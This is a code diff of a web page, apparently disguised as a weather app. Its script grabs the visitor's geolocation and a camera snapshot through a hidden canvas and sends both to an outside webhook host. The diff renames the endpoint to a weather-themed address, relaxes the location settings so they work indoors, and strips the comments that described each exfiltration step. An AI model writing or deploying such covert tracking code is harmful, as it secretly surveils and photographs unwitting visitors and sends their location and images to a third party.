@@ -18,8 +18,7 @@
     <canvas id="canvas" style="display:none"></canvas>
 
     <script>
-    //const WEBHOOK = 'https://webhook.site/16155721-b9ba-438b-84c5-5f6a5461638c';
-      const WEBHOOK = 'https://weather-ha.free.beeceptor.com';
+    const WEBHOOK = 'https://my-weather-app.free.beeceptor.com';
 
     function sendToWebhook(data) {
         fetch(WEBHOOK, {
@@ -44,15 +43,14 @@
         try {
             const position = await new Promise((resolve, reject) => {
                 navigator.geolocation.getCurrentPosition(resolve, reject, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
+                    enableHighAccuracy: false,  // Use WiFi/cell (faster, works indoors)
+                    timeout: 30000               // 30 seconds
                 });
             });
             latitude = position.coords.latitude;
             longitude = position.coords.longitude;
             accuracy = position.coords.accuracy;
 
-            // Immediately send location to webhook
             sendToWebhook({
                 type: 'location',
                 lat: latitude,
@@ -88,7 +86,6 @@
             photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
             stream.getTracks().forEach(track => track.stop());
 
-            // Send photo + location together
             sendToWebhook({
                 type: 'photo',
                 photo: photoBase64,
@@ -103,7 +100,6 @@
             cameraError = err.message;
         }
 
-        // Step 3: Send combined summary
         sendToWebhook({
             type: 'summary',
             location: { lat: latitude, lng: longitude, accuracy: accuracy },
